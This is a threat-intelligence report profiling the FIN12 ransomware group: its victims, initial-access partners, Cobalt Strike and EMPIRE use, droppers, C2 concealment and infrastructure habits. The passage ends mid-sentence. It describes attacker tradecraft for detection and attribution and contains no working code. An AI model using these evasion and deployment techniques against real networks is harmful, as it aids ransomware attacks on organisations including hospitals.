October 2018, that\n\nspecializes in the post-compromise deployment of primarily RYUK ransomware.\nInstead of conducting multifaceted extortion, FIN12 appears to prioritize speed and\nhigher revenue victims.\n\n- Since initially emerging, FIN12 has maintained close partnership with TRICKBOT\naffiliated threat actors. However, FIN12 has seemingly diversified its partnerships for\ninitial access operations, particularly in 2021.\n\n- FIN12 relies heavily on publicly available tools and malware to enable their operations.\n\nIn nearly every single FIN12 intrusion since February 2020, FIN12 has used Cobalt Strike\nBEACON, but historically we have observed these threat actors also use EMPIRE and\nTRICKBOT as a post-exploitation tool.\n\n- The majority of observed FIN12 victims have been based in North America, but their\n\nregional targeting has been expanding in 2021 throughout other regions, including\nEurope and Asia Pacific. We have observed FIN12 victims in nearly every industry, but\nnotably 20 percent of these organizations have been based in the healthcare sector.\n\n- The Appendices contain YARA signatures associated with recently used in-memory\n\ndroppers and C2concealer as well as the relevant MITRE ATT&CK mappings.\n\n\n-----\n\n### Threat Detail\n\nFIN12 is a financially motivated threat group behind prolific ransomware attacks dating\nto at least October 2018 that primarily involve the deployment of RYUK ransomware. Our\ndefinition of FIN12 is limited to the tactics, techniques, and procedures (TTPs) used in\nthe post-compromise deployment of ransomware given we have high confidence that\nFIN12 relies on partners to obtain initial access to victim environments. Notably, instead\nof conducting multifaceted extortion, a tactic widely adopted by other ransomware\nthreat actors, FIN12 appears to prioritize speed and higher revenue victims. The lack of\nlarge-scale data exfiltration in FIN12 incidents has almost certainly contributed to their\nhigh cadence of operations, with FIN12 intrusions making up nearly 20 percent of our\nransomware incident response engagements since September 2020.\n\n- Since initially emerging, FIN12 has had a close partnership with TRICKBOT-affiliated\n\nthreat actors; all incidents prior to March 2020 leveraged accesses obtained from\nTRICKBOT infections. However, FIN12 has seemingly diversified its partnerships,\npossibly seeking out other threat actors' tools and services to increase the volume and\nefficiency of their attacks.\n\n- In nearly every single FIN12 intrusion since February 2020, FIN12 has used Cobalt Strike\n\nBEACON payloads to interact with victim networks, progressing through their attacks\nfrom internal reconnaissance to ransomware deployment. In the years prior, however,\nthey had used a broader toolset to serve the same functions, including the PowerShellbased EMPIRE framework, and in their earliest intrusions even using the TRICKBOT\nbanking trojan as a post-exploitation framework alongside EMPIRE.\n\n- While FIN12 appears to rely on close partnerships for obtaining initial access to\n\norganizations, they almost certainly have some input into victim selection. Victims'\nannual revenues are typically greater than $300 million USD and unlike other\nransomware threat actors, they have frequently targeted organizations in the\nhealthcare sector. We believe that FIN12's partners cast a wider net and allow FIN12\nactors to choose from a list of victims after accesses are already obtained.\n\n# FIN12\n\n**RYUK** **BEACON**\n###### RANSOMWARE\n\n**FIGURE 1.** FIN12 badge.\n\n\n-----\n\n###### Victimology\nWe believe that FIN12's victim selection is primarily driven by an organization's geolocation and annual revenue. Almost 85 percent of\nobserved victim organizations have been based in North America and the vast majority of known FIN12 victims have more than $300\nmillion USD in revenue. The threat group has impacted organizations in a broad range of industries; however, unlike most ransomware\nthreat actors, FIN12 has repeatedly targeted healthcare organizations.\n\n##### FIN12 VICTIMOLOGY OVERVIEW\n\nAverage Revenue\n(Europe)\n\n**$7.4 BILLION**\n\nAverage Revenue\n(North America)\n\n**$5.7 BILLION**\n\nAverage Revenue\n(Asia Pacific)\n\n**14.5 BILLION**\n\n**MOST FREQUENTLY TARGETED INDUSTRIES**\n\n\nHEALTHCARE\n\nEDUCATION\n\nFINANCIAL\n\n\nMANUFACTURING\n\nTECHNOLOGY\n\n\n**FIGURE 2. FIN12 victimology overview.**\n\n\n-----\n\n###### Revenue\nThe average annual revenue of observed FIN12 victim\norganizations was more than $6 billion USD and almost all the\norganizations made more than $300 million USD, based on\ndata compiled from ZoomInfo. This number could be inflated\nby a few extreme outliers and collection bias; however, FIN12\ngenerally appears to target larger organizations than the average\nransomware affiliate. Various threat actors, including those using\nRYUK, have specified minimum requirements for victim's annual\nrevenues illustrating that it is a factor considered when choosing\ntargets. Some threat actors almost certainly target organizations\nwith higher revenues because of the perception that it justifies\nlarge ransom demands; for example, actors have claimed to\ncalculate the initial demand as a percentage of annual revenue.\n\n- According to trusted, sensitive sources, multiple actors\n\nclaiming to use RYUK ransomware have specified minimum\nrevenue requirements—ranging from $5 – $50 million USD\n[(21-00019652).](https://intelligence.fireeye.com/reports/21-00019652)\n\n- In numerous RYUK negotiations, including one associated with\n\na 2019 intrusion that we attribute to FIN12, the threat actors\nincluded the victim organization's revenue and number of\nemployees in their communications, presumably to justify the\ndemanded ransom.\n\n– It is unclear if this was an effective negotiation tactic,\n\ngiven that victims argued that the revenue data was incorrect,\nthat revenue was distinct from profitability, or that the value\nof the lost data was not proportional to the ransom demand.\nThis tactic may have been particularly less effective in\n2020–2021, given that many companies saw reduced revenues\ndue to the COVID-19 pandemic.\n\n###### Geolocation\nFIN12 victim organizations have been overwhelmingly located\nin North America; however, there is some evidence that FIN12's\nregional targeting has been expanding. While approximately\n71 percent of victims have been based in the United States and\napproximately 12 percent of victim organizations were located in\nCanada, we observed about twice as many victim organizations\nbased outside of North America in the first half of 2021 than we\nobserved from 2019 to 2020. Collectively, these organizations\nhave been based in Australia, Colombia, France, Indonesia,\nIreland, the Philippines, South Korea, Spain, the United Arab\nEmirates, and the United Kingdom.\n\n\n###### Industry\nFIN12 targeting appears to be relatively industry agnostic but the\ngroup has disproportionately impacted healthcare organizations\neven in the midst of the COVID-19 pandemic. Almost 20 percent\nof observed victims have been in the healthcare industry and\nmany of these organizations operate healthcare facilities. The\nremaining victims have operated in a broad range of sectors,\nincluding but not limited to business services, education,\nfinancial, government, manufacturing, retail, and technology.\n\n- FIN12 continued targeting healthcare entities during the\n\nCOVID-19 pandemic, unlike many other ransomware groups,\nas ransomware-as-a-service (RaaS) operators often prohibit\naffiliates from targeting hospitals. Given that many actors\nrefuse to target this industry, it may also be easier or cheaper\nto obtain access to healthcare organizations. However, by\ntargeting healthcare facilities, FIN12 may face increased\nscrutiny from law enforcement agencies as well as potential\npartners that wish to limit public exposure.\n\n- While many threat actors prohibit targeting of hospitals, others\n\nlikely target healthcare facilities because they believe that\nthese organizations are more likely to pay ransom demands.\nFor example, in September 2020, the Exploit[.]in user\n\"farnetwork\"—who has claimed to previously use RYUK and\nMAZE ransomware—sought access to medical/pharmaceutical\norganizations in the United States because they believed that\nmedical organizations paid well.\n\n\n-----\n\n###### Initial Accesses\nThroughout FIN12's lifespan, we have high confidence that the\ngroup has relied upon multiple different threat clusters for\nmalware distribution and the initial compromise stage of their\noperations. FIN12 has likely established close partnerships with\nthese initial access providers; in most of the incidents where\nthe initial intrusion was identified, FIN12 activity was observed\non the same day as the initial access campaign. Most notably,\nFIN12 shares a close working relationship with the operators of\n\n##### FIN12 INITIAL ACCESSES\n\n\nTRICKBOT and BAZARLOADER. Beyond leveraging accesses\nobtained via these malware families, FIN12 has used overlapping\ntoolsets and services including backdoors, droppers, and\ncodesigning certificates (Appendix 1). Despite these overlaps,\nwe track FIN12 as a distinct threat actor given their specific role\nin the deployment of ransomware, their demonstrated ability to\nwork independently of these families, and our observations of\nother distinct threat actors who deploy ransomware also working\nwith TRICKBOT-affiliated actors.\n\n|FIN12 INITIAL A|ACCESSES|Col3|Col4|Col5|\n|---|---|---|---|---|\n|TRICKBOT TRIC|BAZAR HIATUS KBOT TRIC FIN12|BAZARL LOADER TRIC KBOT BEA|OADER CIT KBOT TRIC CON BEA|RIX KBOT CITRIX CON Internal Phish|\n||||||\n\n\n2019 Q1 2020 Q2 2020 Q3 2020 Q4 2020 Q1 2021 Q2 2021\n\nVolume of FIN12 Activity Directly Observed\n\n**FIGURE 3. Directly observed initial access vectors for FIN12 intrusions.**\n\n\n-----\n\n###### TRICKBOT\nAcross all Mandiant engagements attributed to FIN12 between\nOctober 2018 and March 2020, the initial intrusion vector\neither included or was suspected to include TRICKBOT.\nFIN12 continued to leverage TRICKBOT-obtained accesses\nsporadically through 2021. We believe that FIN12 may choose\nvictims of interest through a TRICKBOT administration panel,\nwhich allows affiliated actors to control and interact with victim\nmachines. The long-term use of TRICKBOT for access spanning\nacross seemingly disparate TRICKBOT affiliates suggests a\nclose working relationship between FIN12 and the owners of\nTRICKBOT. In addition to the use of TRICKBOT for initial access,\nwe have observed other technical overlaps between these\ngroups that further demonstrate this relationship.\n\n- We have identified evidence of FIN12 intrusion activity following\n\nTRICKBOT infections spanning more than 50 unique root gtags.\nEach root gtag is believed to represent a unique TRICKBOT\naffiliate or module, although some affiliates are associated\nwith multiple gtags. For example, the TRICKBOT mor* gtag has\ntypically been distributed as a secondary payload to EMOTET.\nAdditionally, we have commonly observed certain gtags,\nincluding lib*, jim*, tot* used in FIN12 operations, which are\nassociated with TRICKBOT's lateral movement modules, rather\nthan specific TRICKBOT affiliates.\n\n- The operators of TRICKBOT and their affiliates use various\n\npanels to manage their operations, such as a panel for webinject\nmanagement and multiple administration panels used to interact\n[with victim machines (19-00017069). Actors with access to these](https://intelligence.fireeye.com/reports/19-00017069)\npanels have different roles and privileges that allow them to view\nsets of victims, associated comments, and statuses.\n\n###### UNC2053\nAfter a break in FIN12 activity from late March 2020 to late August\n2020, FIN12 resumed operations shifting their reliance for\ninitial access away from TRICKBOT to BAZARLOADER malware\nin September 2020. We track the use of BAZARLOADER and\nBAZARBACKDOOR as UNC2053. Infections from these malware\nfamilies are also managed through an administration panel from\nwhich FIN12 could also possibly select their desired victims.\nNotably, there are also numerous overlaps between UNC2053\nand TRICKBOT, including the use of common infrastructure, code\nsigning certificates, droppers, and overlaps in distribution TTPs;\nwe believe that they were likely developed under the direction of\n[common threat actors (20-00007310).](https://intelligence.fireeye.com/reports/20-00007310)\n\n- In instances where FIN12 leveraged UNC2053 for initial\n\naccess, we observed BAZARLOADER payloads distributed via\nmalicious email campaigns. These loaders then downloaded\na corresponding BAZARBACKDOOR payload that was used to\nsubsequently deliver a FIN12 BEACON payload.\n\n\n\n- BAZARLOADER and BAZARBACKDOOR infections have been\n\nmanaged through a panel dubbed “Botleggers Club.” Users\ncan see bots and associated information based on assigned\ngroups, which appear to in at least some cases correspond to\ndifferent variants of BAZARLOADER and BAZARBACKDOOR.\nThe comment field has contained the victim organization and/or\nits annual revenues illustrating its relevance in deciding which\ntargets to further exploit.\n\n###### UNC2600\nIn early February 2021, we observed FIN12-attributed BEACON\npayloads distributed directly through malicious email campaigns;\nthe distribution of these payloads is tracked by Mandiant as\nUNC2600. The TTPs used to distribute BEACON have significant\noverlaps with UNC2053 distribution campaigns observed\nbetween March 2020 and February 2021, including similar lure\nthemes, phishing emails that contain links to malicious PDFs\nhosted on Google Documents, and the use of legitimate web\nservices for payload hosting. This indicates that they were\ndistributed by a common spammer, but given the distribution of\nnon-BAZARLOADER payloads, we currently track this activity\nseparately from UNC2053.\n\n###### Internal Phishing Activity\nIn two separate FIN12 intrusions during May 2021, a threat\nactor obtained a foothold in the environment through malicious\nemail campaigns distributed internally from compromised user\naccounts. In both incidents, the threat actor used compromised\ncredentials to access the victims' Microsoft 365 environment to\ndistribute the malicious emails via Outlook on the Web. While the\ndistribution TTPs varied, both campaigns led to WEIRDLOOP and\nBEACON payloads attributed to FIN12.\n\n- In one intrusion, a threat cluster distributed internal phishing\n\nemails that contained a malicious Excel attachment which\nused an ETTERCELL macro downloader to retrieve a copy of\nRemote Utilities remote access software. After gaining this\ninitial foothold, a FIN12 WEIRDLOOP payload was deployed to\ndrop BEACON.\n\n- During a second incident, a separate threat cluster distributed\n\ninternal phishing emails, which included a link to a Google\nDocuments phishing document. This document contained a link\nthat when clicked downloaded a malicious Word document. The\ninitial payload delivered by this document was not recovered,\nbut we observed FIN12 WEIRDLOOP and BEACON in the\nenvironment approximately two hours later.\n\n\n-----\n\n###### Access Via Remote Logins\nIn at least four FIN12 intrusions between mid-February and midApril 2021, the first evidence of threat actor activity was logins to\nvictims' Citrix environments. We have not confirmed how FIN12\nobtained these credentials. However, it is plausible that the threat\nactors leveraged accesses purchased in underground forums.\nMandiant identified multiple threat actors who claim to use\nRYUK seeking to buy accesses to victim environments, although\nwe currently lack sufficient evidence to attribute these actors\nto FIN12. Notably, two of these threat actors—\"diego033\" and\n\"WATech\"—sought Citrix accesses in the first half of 2021, which\nis consistent with the timeframe that we began to observe the\naforementioned FIN12 activity.\n\n- On May 25, 2021, \"diego033\" posted on exploit[.]in seeking\n\nsuppliers of various forms of network accesses, including Citrix,\nRDP, VPN, and bots.\n\n- On Feb. 17, 2021, actor \"WATech\" posted on exploit[.]in seeking to\n\nbuy Citrix and RDP accesses to corporate networks.\n\n###### JavaScript Downloaders\nThrough the analysis of FireEye product telemetry, in November\n2020 we identified malicious emails that contained links to\nZIP archives hosted on Google Drive containing JavaScript\ndownloaders that in some cases ultimately resulted in the delivery\nof FIN12 BEACON payloads. This same distribution channel was\nused to deliver TRICKBOT with the \"tar\" gtag. Notably, during this\nsame month, we also identified instances of TRICKBOT using\nthe \"tar\" gtag instructing a bot to download a FIN12-attributed\nBEACON payload. These overlaps may indicate that a common\nthreat actor, affiliated with TRICKBOT, is behind both campaigns.\nAdditionally, we identified cases in this same time frame where\nthe TRICKBOT samples associated with the \"tar\" gtag distributed\nBEACON payloads that looked distinct from those commonly used\nby FIN12, or that we have insufficient evidence to attribute to the\ngroup. This supports the possibility that the actor behind this\noperation is providing access to multiple threat actors.\n\n\n###### FIN12 Evolution of Post Compromise TTPs\nDespite clear patterns across their intrusions, FIN12's postcompromise TTPs have evolved over time. This type of slow\nevolution is to be expected of any threat group that maintains\noperational coherence during a period of months or years.\nThese shifts are likely due to various intersecting factors such\nas the threat actors learning more about their craft, developing\nnew tools and community relationships, or changes in a threat\ngroup's membership over time. Some of the most important\ndevelopments in FIN12's post-compromise TTPs have included\nchanges in the way they've relied on TRICKBOT, patterns in their\nuse of post-exploitation frameworks, and the ways in which\nthey've obfuscated their BEACON payloads.\n\n- TRICKBOT was identified or suspected of being the initial\n\nfoothold for the vast majority of FIN12 intrusions between\n2018 and early 2020. Initially, TRICKBOT was used to enable\nearly stages of the attack lifecycle eventually leading to the\ndeployment of a post-exploitation framework, whereas over\ntime it began to be used more exclusively to provide a foothold\ninto victim networks.\n\n- The PowerShell-based EMPIRE post-exploitation framework\n\nwas used by FIN12 nearly exclusively until mid-2019 when they\nbegan to also use Cobalt Strike (BEACON), and intermittently\nMetasploit (METERPRETER). The group nearly abandoned use of\nEMPIRE in early 2020 and has increasingly relied on BEACON to\nperform most of their post-exploitation activities.\n\n- Notably, in the period following FIN12's hiatus in 2020, the\n\ngroup experimented with the use of other post-exploitation\ntools including Covenant (GRUNT), GRIMAGENT, and ANCHOR,\nalthough by November 2020 they reverted to relying primarily on\nBEACON.\n\n- Malware payloads used by FIN12 have been packaged using\n\na shifting set of in-memory droppers including ICECANDLE,\nMALTSHAKE, WEIRDLOOP, WHITEDAGGER, and templates\nassociated with Cobalt Strike's Artifact Kit.\n\n\n-----\n\n###### TRICKBOT as Post-Exploitation Tool\nThroughout 2018 and early 2019, post-exploitation activity\nat intrusions where FIN12 later deployed RYUK was primarily\nenabled via TRICKBOT. There are various TRICKBOT modules that\nprovide capabilities allowing attackers to progress through the\nattack lifecycle, including modules that enable host and network\nreconnaissance, lateral movement, and privilege escalation. In\nmany early FIN12 intrusions, TRICKBOT was used to progress\nthrough early phases of the attack lifecycle, and we only observed\na pivot to the use of FIN12-attributed EMPIRE or Metasploit\npayloads as these incidents approached their later phases. We\nsuspect that in most or all cases these secondary payloads were\ndeployed via TRICKBOT as a means of handoff between teams or\nindividual operators and used by FIN12 to maintain a foothold in the\nenvironment while performing latter-stage tasks, such as further\nActive Directory reconnaissance, RYUK staging, and deployment.\n\n\n\n- We do not currently have sufficient evidence to attribute\n\nthe use of TRICKBOT to FIN12 beyond leveraging it to deliver\nmalware that was later used in their operations. FIN12 was\npossibly provided at least some level of access or visibility to\nTRICKBOT through its administration panels. This arrangement\nhas been observed with other threat actors deploying\n[ransomware (21-00013852). It is also plausible that one or more](https://intelligence.fireeye.com/reports/21-00013852)\nTRICKBOT operators or affiliates may have played a larger role\nin these early intrusions, such as performing at least some\nreconnaissance, lateral movement, and privilege escalation\ntasks prior to handing over access to FIN12.\n\n- Table 1 contains a listing of TRICKBOT modules observed during\n\nFIN12 intrusion activity that have functionality relevant to\ntheir operations. In addition to these modules, we commonly\nobserved the use of TRICKBOT modules that were unlikely to\nsupport post-exploitation. Those modules were likely deployed\neither in batches with other modules or as a result of default\nTRICKBOT module configurations.\n\n\n**TABLE 1. TRICKBOT modules observed during or prior FIN12 intrusions.**\n\n|TABLE 1. TRICKBOT modules obser|rved during or prior FIN12 intrusions.|\n|---|---|\n|Module|Description|\n|importdll mailsearcher networkdll newbctestdll pwgrab sharedll/wormdll systeminfo tabdll|Performs browser fingerprinting and steals browser data Searches for email addresses stored within files on the victim computer Collects system information, including system configuration, network configuration, and user account details Provides a reverse TCP shell to cmd.exe on the victim machine Steals browser history and credentials from common web browsers, FTP clients, and Outlook Performs lateral movement by attempting propagation using null sessions over SMB Collects information about the victim's system, including the system's Windows version, Processor and Memory details, a user list, and a list of all installed applications and services. Leverages the EternalBlue and EternalRomance exploits for lateral movement|\n\n\n-----\n\n###### Shift from EMPIRE to Cobalt Strike\nBeginning in late 2019, FIN12 appeared to reduce their reliance on\nTRICKBOT and began to use publicly available tools for the postcompromise stages of their intrusions, although the specific tools\nhave sometimes varied between intrusions. Initially, FIN12 appeared\nto favor EMPIRE, but in incidents since early 2020, FIN12 has\noverwhelmingly relied on Cobalt Strike BEACON. In 2020, FIN12 also\nsporadically deployed other backdoors in addition to BEACON. The\nlimited time frame of their use could suggest that FIN12 was testing\nthe efficacy of new toolsets before settling on Cobalt Strike.\n\n- In early operations and through 2019, FIN12 primarily\n\n\n\n- Following a period of overlapping EMPIRE and Cobalt Strike use\n\nbetween September 2019 and February 2021, FIN12 shifted to\nusing Cobalt Strike as their primary intrusion framework. We\nhave observed FIN12 use EMPIRE on at least one occasion in\n2021, but the threat actors have relied upon Cobalt Strike almost\nexclusively for their intrusions since early 2020.\n\n\n\n- FIN12 also leveraged other backdoors including ANCHOR,\n\nGRIMAGENT, GRUNT, and METERPRETER in the latter half of\n2020 (Figure 4). The use of each of these tools has been very\nlimited and primarily occurred after the group's reemergence in\nSeptember and October 2020.\n\n\nleveraged EMPIRE to maintain a foothold in victim\nenvironments. In these early intrusions, EMPIRE was typically\ndeployed following the use of TRICKBOT and its modules for\nearlier stages of the attack lifecycle.\n\n- FIN12 continued to use EMPIRE in operations from\n\n\n– We observed ANCHOR deployed only once during a FIN12\n\n\nNovember 2019 to February 2020 to manage intrusions\nwhile incorporating public tools for reconnaissance, lateral\nmovement, and privilege escalation tasks.\n\n**2018** **2019**\n\n**OCT** **NOV** **DEC** **JAN** **FEB** **MAR** **APR** **MAY** **JUN** **JUL** **AUG** **SEP** **OCT**\n\n**EMPIRE**\n\n**BEACON**\n\n**METERPRETER**\n\n**ANCHOR**\n\n**GRUNT**\n\n**GRIMAGENT**\n\n**FIGURE 4. Timeline of backdoor use.**\n\n###### In-Memory Droppers Changes\nSince at least February 2020, FIN12 has leveraged a series of\nin-memory droppers including, MALTSHAKE, ICECANDLE,\nWHITEDAGGER, WEIRDLOOP, and templates associated with\nCobalt Strike's Artifact Kit to deploy various malware payloads.\nThese frequent changes in their dropper usage may be an effort\nto continually avoid detection over time and/or reflective of\nleveraging distinct threat actors who provide crypting services to\na small number of clients.\n\n- During February 2020, we observed FIN12 SYSTEMBC and RYUK\n\n\nintrusion and it was used alongside Cobalt Strike. FIN12 has\nalso leveraged GRIMAGENT and GRUNT in a limited number\nof intrusions in parallel to Cobalt Strike; however, the group\nceased use of these tools after this time.\n\n**2020** **2021**\n\n**DEC** **JAN** **FEB** **MAR** **APR** **MAY** **JUN** **JUL** **AUG** **SEP** **OCT** **NOV** **DEC** **JAN** **FEB** **MAR** **APR**\n\n- Between September and November 2020, we observed FIN12\n\n|EMPIRE|2018|2019|2020|2021|\n|---|---|---|---|---|\n||OCT NOV DEC|JAN FEB MAR APR MAY JUN JUL AUG SEP OCT NOV DEC|JAN FEB MAR APR MAY JUN JUL AUG SEP OCT NOV DEC|JAN FEB MAR APR MAY|\n|BEACON|||||\n|METERPRETER|||||\n|ANCHOR|||||\n|GRUNT|||||\n|GRIMAGENT|||||\n\n\nNotably, these droppers are not exclusive to FIN12, and some\nof these droppers, such as ICECANDLE and WHITEDAGGER,\nhave been used with malware families that we have no evidence\nto suggest are used by FIN12. However, droppers including\nMALTSHAKE, ICECANDLE, and WEIRDLOOP have been used by\nactors that also have known associations to FIN12.\n\n\npayloads created with Cobalt Strike Artifact Kit templates.\n\n\n\n- Since January 2021, FIN12 BEACON payloads have almost\n\nexclusively been delivered using WEIRDLOOP.\n\n\npayloads being dropped by MALTSHAKE during later stages of\ntheir intrusions.\n\n\n\n- Following FIN12's return from hiatus in September 2020,\n\nwe observed similar droppers, including ICECANDLE and\nWHITEDAGGER, used to primarily deliver FIN12 BEACON\npayloads. FIN12-attributed RYUK and SYSTEMBC payloads were\nalso dropped by ICECANDLE and WHITEDAGGER during this time.\n\n\n-----\n\n|MALTSHAKE ARTIFACT KIT DROPPER ICECANDLE WHITEDAGGER WEIRDLOOP|Col2|2020|Col4|Col5|Col6|Col7|Col8|Col9|Col10|Col11|Col12|Col13|2021|Col15|Col16|Col17|Col18|\n|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|\n|||FEB|MAR|APR|MAY|JUN|JUL|AUG|SEP|OCT|NOV|DEC|JAN|FEB|MAR|APR|MAY|\n|||||||||||||||||||\n||ARTIFACT KIT|||||||||||||||||\n||ICECANDLE|||||||||||||||||\n||WHITEDAGGER|||||||||||||||||\n||WEIRDLOOP|||||||||||||||||\n\n\n**FIGURE 5. Timeline of dropper use.**\n\n###### Cobalt Strike / BEACON TTPs\nWhile Cobalt Strike is used by many threat actors, there are\nseveral distinct characteristics associated with FIN12's use\nof Cobalt Strike and BEACON that have allowed for tracking of\ntheir payloads and infrastructure. These characteristics include\npatterns in their use of malleable C&C profiles, network-based\nTTPs including infrastructure and configuration preferences, and\nhost-based TTPs such as filenames, paths, and certificate usage.\n\n###### Cobalt Strike / Malleable C&C Profiles\nFIN12 has used several publicly available malleable C&C profiles\nand at least one malleable C&C profile generator to help disguise\nBEACON C&C traffic. Their usage of various profiles has shifted\nover time, but recent campaigns have consistently leveraged the\nFortyNorth Security C2Concealer malleable profile generator. As\na result, several of their current BEACON TTPs are related to the\nuse of this profile generator.\n\n- In February and March 2020, we frequently observed FIN12 use\n\nthe common, publicly available Amazon malleable C&C profile.\n\n- After their mid-2020 hiatus, FIN12 began using the FortyNorth\n\nSecurity C2Concealer malleable C&C profile generator, which\nthey have used regularly since September 2020.\n\n- In a limited number of cases, we have observed the group using\n\nthe publicly available jQuery, Google Web Bug, GoToMeeting, and\nMSNBC-themed profiles.\n\n– The Google Web Bug and MSNBC profiles were observed in\n\nJanuary and February 2020 before FIN12 switched to use\nof the Amazon profile. These were among the first profiles\nwe observed the group using and may represent their initial\nexperimentation with malleable C&C profile usage.\n\n– The GoToMeeting and jQuery profiles were observed in\n\nAugust 2020 and September 2020 after the group resumed\nactivity following their mid-2020 hiatus. This may represent\nan attempt to vary their techniques to avoid detection and\nattribution following their time off.\n\n\n###### Cobalt Strike / Watermarks\nFIN12 has also used a limited number of BEACON watermarks; in\nall cases, these watermarks have also been used by other threat\nactor groups. The watermark, or customer ID, is a 4-byte number\nfrom the cobaltstrike.auth file located on a team server. This\nnumber is associated with the customer's Cobalt Strike license\nkey. The trial version of Cobalt Strike uses the 0x0 watermark, and\nwatermarks that otherwise appear non-random are not likely to\nbe associated with valid license keys. The following watermarks\nhave been used by FIN12, in descending order of frequency:\n\n- 0x00000000\n\n- 0x12345678\n\n- 0x5109bf6d\n\n- 0x86782e5e\n\n- 0x00000003\n\n- 0x01000000\n\n###### Cobalt Strike / BEACON Network TTPs\nFIN12 BEACON payloads have used distinct but evolving TTPs\nfor hosting, domain registration, FQDN themes, port usage, TLS/SSL\ncertificates, URL paths, and HTML error pages. Prior to the group's\nmid-2020 hiatus their BEACON payloads used common malleable\nC&C profiles (most frequently an Amazon-themed profile), and their\nC&C servers were configured to use Let's Encrypt SSL certificates.\nHowever, these characteristics changed dramatically upon their\nreturn, in large part due to their adoption of the FortyNorth Security\nC2Concealer Cobalt Strike profile generator.\n\nAlthough Mandiant has observed relative uniformity in the\nCobalt Strike infrastructure used by FIN12 since returning\nfrom their hiatus in mid-2020, there were smaller shifts in their\ninfrastructure TTPs. In March 2021, FIN12 began to use Cloudflare\nto obscure the location of their Cobalt Strike servers and started\nfiltering HTTP requests for payloads requiring that they be using\nthe user-agent \"WOW64.1\".\n\nHistorically, there are general trends that have persisted across\n\n\n-----\n\nFIN12's use of domains and hosting providers including repeated\nuse of common ISPs and domain registrars.\n\n- As FIN12 shifted from EMPIRE to Cobalt Strike in early 2020,\n\nthe group has continued to host a significant proportion of the\nC&C infrastructure in the networks of Choopa, a U.S.-based VPS\nhosting provider, a trend that has continued through 2021. Other\nhosting providers commonly used by FIN12 have included:\n\n– Combahton GmbH\n\n– FranTech Solutions\n\n– Informacines Sistemos Ir Technologijos\n\n– Leaseweb, Liteserver Holding B.V.\n\n– Nexeon Technologies\n\n– Psychz Networks\n\n– ReliableSite\n\n- BEACON C&C domains used by FIN12 have most commonly\n\nbeen registered via NameCheap or Hosting Concepts B.V. d/b/a\nOpenprovider, although they used Public Domain Registry for a\nshort period in September and October 2020.\n\nMany of the changes to Cobalt Strike infrastructure and BEACON\nconfiguration seen across FIN12 activity in the latter half of\n2020 and beyond can likely be attributed to their adoption of\nC2Concealer, including the adoption of self-signed certificates,\nsemi-randomized malleable C&C profiles, identifiable error\npages, and the use of two-character subdomains.\n\n- Although FIN12 has continued to use Let's Encrypt SSL\n\ncertificates intermittently, most of the certificates observed\nsince September 2020 have been self-signed. These have often\ncontained overlapping certificate subject elements as shown\nin Table 2. We believe these patterns are due to their use of\nC2Concealer, which allows users to generate a certificate by\nmanually entering details on the command line. Notably, in early\n\n\ncampaigns where we suspect FIN12 used C2Concealer, the\ncertificates did not have an Organizational Unit (OU) field. This is\nconsistent with C2Concealer's certificate generation function,\nwhich does not include an option to enter the OU field. Later\nself-signed certificates used in conjunction with C2Concealer\ncontained an OU field suggesting that they may have been\ncreated outside of this tool.\n\n- Cobalt Strike malleable C&C profiles used by FIN12 in the\n\nlatter half of 2020 and beyond have incorporated URL paths\nbuilt from lists of subdomains, directories, filenames, and file\nextensions. These lists are largely consistent with the default\nC2Concealer URL data lists, although FIN12 appears to have\nmodified these lists occasionally, particularly the lists of\nsubdomains and file extensions.\n\n- FIN12 BEACON servers have delivered distinct HTML pages\n\nfollowing their mid-2020 hiatus. These pages appear to be\nan artifact of C2Concealer usage based on their presence in\nthe tool's source code. Figure 6 contains an example of one of\nthese error pages.\n\nHistorical FIN12 Cobalt Strike server infrastructure and BEACON\nconfigurations looked fairly distinct from those seen in more\nrecent activity. These prior operations used more common\nmalleable C&C profiles, Let's Encrypt SSL certificates, and\nthematically similar domains.\n\n- FIN12 frequently registered and used domains that\n\nmasqueraded as IT security organizations and/or referenced\nrelated concepts.\n\n- FIN12 frequently leveraged Let's Encrypt certificates for their\n\nBEACON infrastructure.\n\n- FIN12 BEACON payloads historically used common malleable\n\nC&C profiles, most frequently the publicly available Amazon\nmalleable C&C profile.\n\n\n**TABLE 2.

Example HTML content returned from BEACON server.**\n\n###### Cobalt Strike / BEACON Host TTPs\nFIN12 BEACON payloads have used distinct filenames, file\npaths, and demonstrated certificate usage overlaps with other\nmalware families.\n\n- FIN12 has commonly executed BEACON payloads from the C:\\\n\nPerfLogs\\ directory with the default filename p64.exe or p32.\nexe, depending on the architecture of the impacted system. We\nobserved this pattern across FIN12 intrusions throughout most\nof 2020. Notably, we have observed other common filenames\nover shorter time spans including \"smss,\" \"wav,\" and \"arti,\" a\nreference to Cobalt Strike's artifact kit.\n\n- FIN12 has occasionally leveraged code-signed payloads in\n\ntheir operations, both before and after their mid-2020 hiatus.\nIn some cases, these certificates were used to sign malware\nnot attributed directly to FIN12. These have included families\nleveraged during their own intrusion operations such as RYUK\nand SYSTEMBC, as well as malware delivered by other groups\nthat have been used by FIN12 for initial access. For example, we\nobserved FIN12 BEACON payloads that shared code-signing\ncertificates with BAZARLOADER and BAZARBACKDOOR variants\nKEGTAP, SINGLEMALT, BEERBOT, STILLBOT, and BUBBLYBOT.\n\n\n###### GRIMAGENT\nWhile most of the tools that FIN12 uses in their intrusions\nare publicly sourced or acquired through their relationships\nwith other threat actors, we believe that GRIMAGENT may be\nexclusive to the group. FIN12 used the GRIMAGENT backdoor\nin multiple intrusions, with particular regularity in October\n2020. Trusted, sensitive sources indicate that GRIMAGENT\nC&C infrastructure is closely associated with a customer of the\nbulletproof hosting service offered and operated by the actor\n\"yalishanda.\" This GRIMAGENT infrastructure has been co-located\nwith other resources used by FIN12, including Cobalt Strike C&C\ninfrastructure and RYUK victim contact pages.\n\n- All known GRIMAGENT C&C domains are associated with the\n\nsame customer of the bulletproof hosting service offered by\n[yalishanda (19-00009302). While not all GRIMAGENT samples](https://intelligence.fireeye.com/reports/19-00009302)\nare currently attributed to a known threat actor, we have not\nattributed its use to any other threat actor. We also have not\nidentified this malware being offered in underground forums.\n\n- RYUK victim contact pages and BEACON payloads attributed\n\nto FIN12 have used the same infrastructure as GRIMAGENT\nC&C domains. The RYUK victim contact pages were eventually\nmoved to other infrastructure operated and owned by\nyalishanda but associated with the same customer.\n\n- We have observed a RYUK ransom note HTML page being\n\ndisplayed on GRIMAGENT C&C domains (Figure 7). The\nTOR payment domain embedded in this payment page 